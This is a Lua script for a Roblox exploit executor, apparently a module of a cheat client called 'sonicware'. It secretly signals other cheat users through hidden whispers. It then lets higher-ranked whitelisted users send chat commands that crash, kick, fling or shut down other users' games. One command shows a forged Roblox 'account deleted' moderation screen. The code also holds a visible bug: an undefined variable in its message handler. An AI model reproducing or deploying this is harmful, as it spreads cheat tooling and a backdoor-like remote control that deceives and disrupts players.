repeat task.wait() until shared.snwls ~= nil
repeat task.wait() until shared.GUI
local replicatedStorageService = game:GetService("ReplicatedStorage")
local playersService = game:GetService("Players")
local lplr = playersService.LocalPlayer
local textChatService = game:GetService("TextChatService")
local function HandPlr(v)
  if shared.snwls:CheckWhitelisted(v) == false then return end
  if v ~= lplr and not shared.snwls:CheckWhitelisted(lplr) then
    repeat task.wait() until game:IsLoaded()
    replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." KVOP35KYFPXP2", "All")
    task.spawn(
      function()
        local connection
        for i,newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
					if newbubble:IsA("TextLabel") and newbubble.Text:find("KVOP35KYFPXP2") then
            newbubble.Parent.Parent.Visible = false
            repeat task.wait() until newbubble:IsDescendantOf(nil) 
            if connection then
						  connection:Disconnect()
						end
					end
				end
				connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:Connect(function(newbubble)
					if newbubble:IsA("TextLabel") and newbubble.Text:find("KVOP35KYFPXP2") then
              newbubble.Parent.Parent.Visible = false
              repeat task.wait() until newbubble:IsDescendantOf(nil)
						  if connection then
								connection:Disconnect()
							end
						end
					end
        )
      end
    )
    replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Wait()
    task.wait(.2)
    if getconnections then
			for i,v in pairs(getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
				if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
          debug.getupvalues(v.Function)[1]:SwitchCurrentChannel("all")
				end
			end
    end
  end
end
for i, v in pairs(playersService:GetPlayers()) do task.spawn(HandPlr, v) end
playersService.PlayerAdded:Connect(function(v) task.spawn(HandPlr, v) end)

local cmds = {
  ["kill"] = function(a)
    if not lplr.Character then return end
    local hum = lplr.Character:FindFirstChild("Humanoid")
    if not hum then return end
    hum.Health = 0
  end,
  ["byfron"] = function(x)
    task.spawn(function()
					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					lplr.PlayerGui:ClearAllChildren()
					GuiLibrary.MainGui.Enabled = false
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					lplr:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				end)
  end,
  ["lagback"] = function(y)
    if not lplr.Character or not lplr.Character.HumanoidRootPart then return end
    local x = lplr.Character.HumanoidRootPart
    x.Velocity = Vector3.new(9999999, 9999999, 9999999)
  end,
  ["crash"] = function(x)
    -- never works for uwp.
    if not setfpscap then return end
    setfpscap(9e9)
  end,
  ["rickroll"] = function(y)
local function funnyfunc(v)
					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
						v.Image = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Image"):Connect(function()
							v.Image = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
						if v.Text ~= "" then
							v.Text = "Never gonna give you up"
						end
						v:GetPropertyChangedSignal("Text"):Connect(function()
							if v.Text ~= "" then
								v.Text = "Never gonna give you up"
							end
						end)
					end
					if v:IsA("Texture") or v:IsA("Decal") then
						v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Texture"):Connect(function()
							v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("MeshPart") then
						v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureID"):Connect(function()
							v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("SpecialMesh") then
						v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureId"):Connect(function()
							v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("Sky") then
						v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
					end
				end
			
				for i,v in pairs(game:GetDescendants()) do
					funnyfunc(v)
				end
				game.DescendantAdded:Connect(funnyfunc)
  end,
  ["gravity"] = function(a)
    workspace.Gravity = tonumber(a[1]) or 192.6
  end,
  ["kick"] = function(e) lplr:Kick(e or "Get kicked by private lol") end,
  ["ban"] = function(e) lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]") end,
  ["uninject"] = function(s)
    if shared.GuiLibrary then shared.GuiLibrary:SelfDestruct() end
  end,
  ["shutdown"] = function(r) game:Shutdown() end,
  ["errorkick"] = function(g) 
    if not lplr.Character then return end
    local hum = lplr.Character.Head
    hum:Destroy()
  end
}
local asne = {}
local xeis = "KVOP35KYFPXP2"
local function findplr(s, e)
  local tp = {}
  local cc = true
  if s == "default" and cc then 
    if shared.snwls:CheckLocalWhitelisted() == false then table.insert(tp, lplr) end
  end
  if s == "private" and cc then 
    if shared.snwls:CheckLocalWhitelisted() == true then table.insert(tp, lplr) end
  end
  for i, v in pairs(game:GetService("Players"):GetPlayers()) do
    if cc and v.Name:lower():sub(1, s:len()) == s:lower() then 
      table.insert(tp, v)
      cc = false
    end
  end
  return tp
end
local function msg(plr, msg, args, t)
  --[[
  Variables:
  plr > Whitelisted Player
  msg > Entire Message
  args > Whole Args
  t > tab
  --]]
  local lpos = shared.snwls.table[tostring(lplr.UserId)] and shared.snwls.table[tostring(lplr.UserId)]["pos"] or 1
  local opos = shared.snwls.table[tostring(plr.UserId)] and shared.snwls.table[tostring(plr.UserId)]["pos"] or 1
  if plr == lplr then return end -- I'm not recommending admins to troll
  if lpos > 2 and t.MessageType == "Whisper" and msg:find(xeis) and asne[plr.Name] == nil then
    asne[plr.Name] = true
    shared.GUI:CreateNotification("warning", plr.Name.." is using sonicware!", 60)
  end
  if opos > 2 and lpos < opos and #args > 1 then
    table.remove(args, 1)
    local chosenplayers = findplr(args[1], plr)
		if table.find(chosenplayers, lplr) then
			table.remove(args, 1)
			for i,v in pairs(cmds) do
				if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
					  v(args)
					break
				end
			end
    end
  end
end
if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
  textChatService.MessageReceived:Connect(
    function(tab)
      plr = tab.TextSource
			local args = tab.Text:split(" ")
      if not plr or shared.snwls:CheckWhitelisted(plr) == false then return end
      msg(plr, tab.Text, args, tab)
    end
  )
else
  replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(
    function(tab, channel)
      local plr = playersService:FindFirstChild(tab.FromSpeaker)
      local args = tab.Message:split(" ")
      if not plr or shared.snwls:CheckWhitelisted(plr) == false then return end
      msg(plr, tab.Message, args, tab)
    end
  )
end